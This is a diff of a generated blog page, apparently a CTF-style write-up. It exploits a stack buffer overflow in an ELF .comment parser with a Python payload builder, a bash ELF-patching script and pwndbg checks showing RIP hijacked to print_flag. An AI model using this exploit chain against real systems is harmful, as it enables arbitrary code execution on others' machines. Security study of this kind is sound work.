@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>Buffer overflow writeup | Vasilis&#39; Security Notes</title>
 <meta name="keywords" content="vulnerability research, buffer overflow, linux, binary exploitation">
 <meta name="description" content="1. Overview of the Vulnerability
@@ -38,16 +38,16 @@ As soon as a &#39;)&#39; is read, the loop breaks and writes a NUL at comment[id
 
 By carefully choosing where two &#39;(&#39; characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.">
 <meta name="author" content="Vasilis">
-<link rel="canonical" href="http://localhost:1313/writeups/buffer-overflow/">
+<link rel="canonical" href="https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://vasilis-security-notes.vercel.app/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://vasilis-security-notes.vercel.app/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://vasilis-security-notes.vercel.app/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://vasilis-security-notes.vercel.app/apple-touch-icon.png">
+<link rel="mask-icon" href="https://vasilis-security-notes.vercel.app/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/buffer-overflow/">
+<link rel="alternate" hreflang="en" href="https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/">
 <noscript>
     <style>
         #theme-toggle,
@@ -84,7 +84,107 @@ By carefully choosing where two &#39;(&#39; characters appear in the input, we c
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:url" content="https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/">
+  <meta property="og:site_name" content="Vasilis&#39; Security Notes">
+  <meta property="og:title" content="Buffer overflow writeup">
+  <meta property="og:description" content="1. Overview of the Vulnerability When readelf processes the .comment section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named comment[]. Internally, the code looks roughly like this:
+#define MAX_COMMENT 128 char comment[MAX_COMMENT]; int version_start = 0, idx = 0; char c; /* xsh_offset points to the file‐offset of .comment’s data */ while (pread(fd, &amp;c, 1, xsh_offset &#43; idx) == 1) { if (c == &#39;(&#39;) { version_start = idx &#43; 1; } else if (c == &#39;)&#39;) { break; } else if (version_start != 0) { /* UNBOUNDED WRITE: */ comment[idx - version_start] = c; } idx&#43;&#43;; } comment[idx - version_start] = &#39;\0&#39;; file_printf(ms, &#34;, os/compiler version =&gt; [%s]&#34;, comment); comment is 128 bytes long, stored at RBP - 0xF0 through RBP - 0x70 on x86-64. Whenever the code sees a &#39;(&#39;, it sets version_start = idx &#43; 1. From that point on, each subsequent byte (up until a &#39;)&#39;) is written to comment[idx - version_start]. There is no bounds check on idx - version_start, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP). As soon as a &#39;)&#39; is read, the loop breaks and writes a NUL at comment[idx - version_start]. By carefully choosing where two &#39;(&#39; characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-06-30T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-30T00:00:00+00:00">
+    <meta property="article:tag" content="Vulnerability Research">
+    <meta property="article:tag" content="Buffer Overflow">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Binary Exploitation">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Buffer overflow writeup">
+<meta name="twitter:description" content="1. Overview of the Vulnerability
+When readelf processes the .comment section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named comment[]. Internally, the code looks roughly like this:
+#define MAX_COMMENT 128
+char comment[MAX_COMMENT];
+int  version_start = 0, idx = 0;
+char c;
+
+/* xsh_offset points to the file‐offset of .comment’s data */
+while (pread(fd, &amp;c, 1, xsh_offset &#43; idx) == 1) {
+    if (c == &#39;(&#39;) {
+        version_start = idx &#43; 1;
+    }
+    else if (c == &#39;)&#39;) {
+        break;
+    }
+    else if (version_start != 0) {
+        /* UNBOUNDED WRITE: */
+        comment[idx - version_start] = c;
+    }
+    idx&#43;&#43;;
+}
+comment[idx - version_start] = &#39;\0&#39;;
+file_printf(ms, &#34;, os/compiler version =&gt; [%s]&#34;, comment);
+
+comment is 128 bytes long, stored at RBP - 0xF0 through RBP - 0x70 on x86-64.
+Whenever the code sees a &#39;(&#39;, it sets version_start = idx &#43; 1. From that point on, each subsequent byte (up until a &#39;)&#39;) is written to comment[idx - version_start].
+There is no bounds check on idx - version_start, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP).
+As soon as a &#39;)&#39; is read, the loop breaks and writes a NUL at comment[idx - version_start].
+
+By carefully choosing where two &#39;(&#39; characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://vasilis-security-notes.vercel.app/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Buffer overflow writeup",
+      "item": "https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Buffer overflow writeup",
+  "name": "Buffer overflow writeup",
+  "description": "1. Overview of the Vulnerability When readelf processes the .comment section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named comment[]. Internally, the code looks roughly like this:\n#define MAX_COMMENT 128 char comment[MAX_COMMENT]; int version_start = 0, idx = 0; char c; /* xsh_offset points to the file‐offset of .comment’s data */ while (pread(fd, \u0026amp;c, 1, xsh_offset + idx) == 1) { if (c == \u0026#39;(\u0026#39;) { version_start = idx + 1; } else if (c == \u0026#39;)\u0026#39;) { break; } else if (version_start != 0) { /* UNBOUNDED WRITE: */ comment[idx - version_start] = c; } idx++; } comment[idx - version_start] = \u0026#39;\\0\u0026#39;; file_printf(ms, \u0026#34;, os/compiler version =\u0026gt; [%s]\u0026#34;, comment); comment is 128 bytes long, stored at RBP - 0xF0 through RBP - 0x70 on x86-64. Whenever the code sees a '(', it sets version_start = idx + 1. From that point on, each subsequent byte (up until a ')') is written to comment[idx - version_start]. There is no bounds check on idx - version_start, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP). As soon as a ')' is read, the loop breaks and writes a NUL at comment[idx - version_start]. By carefully choosing where two '(' characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.\n",
+  "keywords": [
+    "vulnerability research", "buffer overflow", "linux", "binary exploitation"
+  ],
+  "articleBody": "1. Overview of the Vulnerability When readelf processes the .comment section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named comment[]. Internally, the code looks roughly like this:\n#define MAX_COMMENT 128 char comment[MAX_COMMENT]; int version_start = 0, idx = 0; char c; /* xsh_offset points to the file‐offset of .comment’s data */ while (pread(fd, \u0026c, 1, xsh_offset + idx) == 1) { if (c == '(') { version_start = idx + 1; } else if (c == ')') { break; } else if (version_start != 0) { /* UNBOUNDED WRITE: */ comment[idx - version_start] = c; } idx++; } comment[idx - version_start] = '\\0'; file_printf(ms, \", os/compiler version =\u003e [%s]\", comment); comment is 128 bytes long, stored at RBP - 0xF0 through RBP - 0x70 on x86-64. Whenever the code sees a '(', it sets version_start = idx + 1. From that point on, each subsequent byte (up until a ')') is written to comment[idx - version_start]. There is no bounds check on idx - version_start, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP). As soon as a ')' is read, the loop breaks and writes a NUL at comment[idx - version_start]. By carefully choosing where two '(' characters appear in the input, we can control exactly when the code starts writing to comment[0] and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When doshn eventually returns, it will pop our crafted return address from the stack.\n2. Exploitation Strategy (the “Two-(” Trick) First ( sets up a “start index.”\nThe very first ( in the input sets version_start = idx + 1. We can decide at which idx that happens by prepending junk bytes. Refill comment[0..127] exactly once.\nAfter the first (, we send 128 filler bytes, which fill comment[0..127] without overflow. This ensures the next writes go out of bounds in a fully predictable way. Second ( resets version_start again.\nWhen the second ( arrives at a known idx, it performs version_start = idx + 1. From that moment on, each new byte lands at comment[idx - version_start]. If we send 248 bytes after that point, then the first of those 248 lands in comment[248], which is the saved-RIP slot. Overwrite saved-RIP with a chosen 8-byte address.\nWe craft eight little-endian bytes immediately after those 248 filler bytes. This overwrites the saved-RIP. Send ')' to break the loop (no write on that iteration).\nThis prevents further writes from corrupting other locals or messing up version_start/idx. Then the function does a ret, popping our overwritten value into %rip. By carefully counting bytes, we can place any 64-bit address into saved-RIP and force execution to jump there when doshn returns.\n3. Payload Construction (payload.bin) Below is the Python snippet that creates a 387-byte payload. We annotate every region by its “loop index” (idx) and show where saved-RIP gets overwritten:\n# 8‐byte return address we want (e.g. address of print_flag) # Little-endian: 0x004241f2 -\u003e b\"\\xf2\\x41\\x42\\x00\\x00\\x00\\x00\\x00\" MANUAL_RIP = b\"\\xf2\\x41\\x42\\x00\\x00\\x00\\x00\\x00\" blob = b\"(\" # idx = 0 -\u003e version_start := 1 # (No write into comment[] on this byte.) blob += b\"A\" * 128 # idx = 1..128 -\u003e comment[idx - 1] = 'A' # After idx=128, comment[0..127] is fully “A”. Now idx -\u003e 129. blob += b\"(\" # idx = 129 -\u003e version_start := 130 # (No write on this byte.) # Now idx -\u003e 130. # At idx=130, “idx - version_start = 0.” Next writes land in comment[0..]. # To reach saved-RIP (offset 248), send 248 filler bytes “B”: blob += b\"B\" * 248 # idx=130..257 (128 B’s) refill comment[0..127]. # idx=258..377 (120 B’s) overflow into comment[128..247] (locals \u0026 saved-RBP). # Now idx = 378. (378 - 130 = 248) -\u003e offset 248 = saved-RIP LSB. # Overwrite saved-RIP (8 bytes): blob += MANUAL_RIP # idx = 378..385 -\u003e comment[248..255] = \"\\xf2\\x41\\x42\\x00\\x00\\x00\\x00\\x00\" # Finally, idx=386 -\u003e send “)” to break the loop (no write): blob += b\")\" # Loop ends; doshn will call ret, popping 0x004241f2 into RIP. with open(\"payload.bin\", \"wb\") as f: f.write(blob) print(f\"payload.bin is {len(blob)} bytes (should be 387).\") First \"(\" at idx=0 sets version_start = 1. 128× \"A\" at idx=1..128 fills comment[0..127]. Second \"(\" at idx=129 sets version_start = 130. 248× \"B\" at idx=130..377 idx=130..257 (128 bytes) refill comment[0..127]. idx=258..377 (120 bytes) overflow into locals and saved-RBP up through offset 247. 8 bytes of MANUAL_RIP at idx=378..385 overwrite saved-RIP (offset 248..255). Final \")\" at idx=386 breaks the loop, preventing any further writes. After that, doshn does a ret, and the CPU pops 0x004241f2 into %rip, redirecting execution.\n4. Patching a Minimal ELF (patch.sh) We start from a trivial C program:\nint main(void) { return 0; } Compile it (e.g., gcc -no-pie -o exploit.elf exploit.c) to produce a minimal ELF named exploit.elf. That ELF automatically has a .comment section (filled with compiler version strings). We will remove that section and replace it with our payload.bin.\n#!/usr/bin/env bash # # patch.sh # # 1) Removes any existing .comment section from exploit.elf. # 2) Injects payload.bin as a new .comment section (with ALLOC flag). # 3) Patches .comment’s sh_size field to be 0x7f (127). # # Usage: # 1) Generate payload.bin as shown above. # 2) Update FILE, PAYLOAD, E_SHOFF_HEX, COMMENT_SEC_IDX below. # 3) chmod +x patch_and_inject.sh \u0026\u0026 ./patch_and_inject.sh # 4) Verify with `readelf -S exploit.elf | grep .comment` # ##### -- USER‐EDITABLE SECTION ---------------------------------------------------- FILE=\"exploit.elf\" # The ELF to patch PAYLOAD=\"payload.bin\" # The malicious payload # From `readelf -h exploit.elf`: # Start of section headers: 0x E_SHOFF_HEX=\"0x4768\" # From `readelf -S exploit.elf | grep \"\\.comment\"` (before patch): # [ 25] .comment … COMMENT_SEC_IDX=25 ##### -- END OF USER‐EDITABLE SECTION -------------------------------------------- # 1) Remove any existing .comment objcopy --remove-section .comment \"$FILE\" 2\u003e/dev/null || true # 2) Add payload.bin as .comment (with ALLOC so readelf will load it) objcopy --add-section .comment=\"$PAYLOAD\" --set-section-flags .comment=contents,alloc \"$FILE\" || { echo \"Injection failed\"; exit 1; } echo \"Before patch:\" readelf -S \"$FILE\" | grep '\\.comment' # 3) Compute where to patch sh_size for .comment to 0x7f E_SHOFF=$((E_SHOFF_HEX)) BYTES_PER_SHDR=64 SH_SIZE_OFFSET=32 # within each Elf64_Shdr SH_SIZE_FIELD_OFFSET=$(( E_SHOFF + COMMENT_SEC_IDX*BYTES_PER_SHDR + SH_SIZE_OFFSET )) printf '\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00' | dd of=\"$FILE\" bs=1 seek=\"$SH_SIZE_FIELD_OFFSET\" count=8 conv=notrunc status=none echo \"After patch:\" readelf -S \"$FILE\" | grep '\\.comment' Step 1: --remove-section .comment deletes the existing .comment. Step 2: --add-section .comment=payload.bin creates a new .comment containing our 387 bytes. We set contents,alloc so that section is loaded. Step 3: We patch the sh_size field (8 bytes at offset E_SHOFF + 64*COMMENT_SEC_IDX + 32) to 0x7f so that readelf will only read the first 127 bytes of .comment (enough to trigger the overflow). After running this script, exploit.elf has a .comment of size 0x7f whose contents begin with our 387-byte payload. When doshn reads up to 127 bytes of that section, it will see both ( characters, overflow into saved-RIP, and then return into our chosen address.\n5. Verifying the Exploit under pwndbg Launch pwndbg on the patched binary: pwndbg --args ./file -m magic.mgc exploit.elf Inside GDB: pwndbg\u003e b readelf.c:1510 # break right before “comment[idx-version_start] = '\\0'”\rpwndbg\u003e run You should see: Breakpoint 1, doshn (…) at readelf.c:1510 Check local variables:\npwndbg\u003e info locals\rc = 41 # ')'\ridx = 386\rversion_start = 130\rcomment = \"B\"*128\r… version_start = 130 confirms the second ( arrived at idx = 129. idx = 386 means we just processed the final ')'. Find comment[0] in memory (using rdx, which was set by lea rdx, [rbp-0xf0] earlier):\npwndbg\u003e print/x $rdx\r$1 = 0x7fffffffd490 # example address of comment[0] Compute saved-RIP = comment[0] + 0xf8 (248 bytes past):\npwndbg\u003e print/x $rdx + 0xf8\r$2 = 0x7fffffffd588 # address of saved-RIP Dump the 8 bytes at that address:\npwndbg\u003e x/gx $rdx + 0xf8\r0x7fffffffd588: 0x00000000004241f2 Those eight bytes match our MANUAL_RIP = b\"\\xf2\\x41\\x42\\x00\\x00\\x00\\x00\\x00\", so saved-RIP was overwritten correctly with 0x004241f2.\nExecute the ret so it actually jumps:\npwndbg\u003e finish GDB prints:\nRun till exit from #0 doshn (…) at readelf.c:1510\r0x00000000004241f2 in print_flag () That shows control has transferred to print_flag at 0x4241f2. You have successfully hijacked RIP.\n6. Summary Vulnerability: Unbounded stack write in doshn when parsing .comment. Two carefully placed ( characters cause writes to overflow from a 128-byte buffer into saved-RIP. Payload: 387 bytes that: Perform two “(`)” markers at strategic indices to reset the write base, Overflow exactly 248 bytes past the second ( into saved-RIP, Place an 8-byte target address (little-endian) at saved-RIP, Break with ')' so no further writes occur. ELF Injection: We carve out a minimal ELF (exploit.elf), remove its original .comment, insert payload.bin, and patch .comment.sh_size to 0x7f. Verification: Under pwndbg, at the overwrite‐site breakpoint: Check version_start = 130 (second ( at idx=129). Read saved-RIP from comment[0] + 248 = $rdx + 0xf8. Confirm the 8 bytes equal our chosen return address. Use finish (or stepi) to execute the ret and land in print_flag. This end-to-end chain demonstrates a reliable stack-buffer overflow in readelf’s .comment parser that grants arbitrary code execution by overwriting the return address.\n",
+  "wordCount" : "1504",
+  "inLanguage": "en",
+  "datePublished": "2025-06-30T00:00:00Z",
+  "dateModified": "2025-06-30T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Vasilis"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://vasilis-security-notes.vercel.app/writeups/buffer-overflow/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Vasilis' Security Notes",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://vasilis-security-notes.vercel.app/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -102,7 +202,7 @@ By carefully choosing where two &#39;(&#39; characters appear in the input, we c
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Vasilis&#39; Security Notes (Alt + H)">Vasilis&#39; Security Notes</a>
+            <a href="https://vasilis-security-notes.vercel.app/" accesskey="h" title="Vasilis&#39; Security Notes (Alt + H)">Vasilis&#39; Security Notes</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -128,17 +228,17 @@ By carefully choosing where two &#39;(&#39; characters appear in the input, we c
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="https://vasilis-security-notes.vercel.app/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/research/" title="Research">
+                <a href="https://vasilis-security-notes.vercel.app/research/" title="Research">
                     <span>Research</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/writeups/" title="Writeups">
+                <a href="https://vasilis-security-notes.vercel.app/writeups/" title="Writeups">
                     <span>Writeups</span>
                 </a>
             </li>
@@ -345,15 +445,17 @@ By carefully choosing where two &#39;(&#39; characters appear in the input, we c
 <hr>
 <h2 id="5-verifying-the-exploit-under-pwndbg">5. Verifying the Exploit under pwndbg<a hidden class="anchor" aria-hidden="true" href="#5-verifying-the-exploit-under-pwndbg">#</a></h2>
 <ol>
-<li>
-<p><strong>Launch pwndbg on the patched binary</strong>:</p>
+<li><strong>Launch pwndbg on the patched binary</strong>:
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg --args ./file -m magic.mgc exploit.elf
-</span></span></code></pre></div><p>Inside GDB:</p>
+</span></span></code></pre></div>Inside GDB:
 <pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; b readelf.c:1510    # break right before “comment[idx-version_start] = &#39;\0&#39;”
 pwndbg&gt; run
-</code></pre><p>You should see:</p>
-<pre tabindex="0"><code>Breakpoint 1, doshn (…) at readelf.c:1510
+</code></pre>You should see:
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">Breakpoint 1, doshn (…) at readelf.c:1510
 </code></pre></li>
+</ol>
+<hr>
+<ol start="2">
 <li>
 <p><strong>Check local variables</strong>:</p>
 <pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; info locals
@@ -387,7 +489,7 @@ $2 = 0x7fffffffd588    # address of saved-RIP
 <p><strong>Execute the <code>ret</code> so it actually jumps</strong>:</p>
 <pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; finish
 </code></pre><p>GDB prints:</p>
-<pre tabindex="0"><code>Run till exit from #0  doshn (…) at readelf.c:1510
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">Run till exit from #0  doshn (…) at readelf.c:1510
 0x00000000004241f2 in print_flag ()
 </code></pre><p>That shows control has transferred to <code>print_flag</code> at <code>0x4241f2</code>. You have successfully hijacked RIP.</p>
 </li>
@@ -421,17 +523,17 @@ $2 = 0x7fffffffd588    # address of saved-RIP
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/vulnerability-research/">Vulnerability Research</a></li>
-      <li><a href="http://localhost:1313/tags/buffer-overflow/">Buffer Overflow</a></li>
-      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
-      <li><a href="http://localhost:1313/tags/binary-exploitation/">Binary Exploitation</a></li>
+      <li><a href="https://vasilis-security-notes.vercel.app/tags/vulnerability-research/">Vulnerability Research</a></li>
+      <li><a href="https://vasilis-security-notes.vercel.app/tags/buffer-overflow/">Buffer Overflow</a></li>
+      <li><a href="https://vasilis-security-notes.vercel.app/tags/linux/">Linux</a></li>
+      <li><a href="https://vasilis-security-notes.vercel.app/tags/binary-exploitation/">Binary Exploitation</a></li>
     </ul>
   </footer>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Vasilis&#39; Security Notes</a></span> · 
+        <span>&copy; 2025 <a href="https://vasilis-security-notes.vercel.app/">Vasilis&#39; Security Notes</a></span> · 
 
     <span>
         Powered by
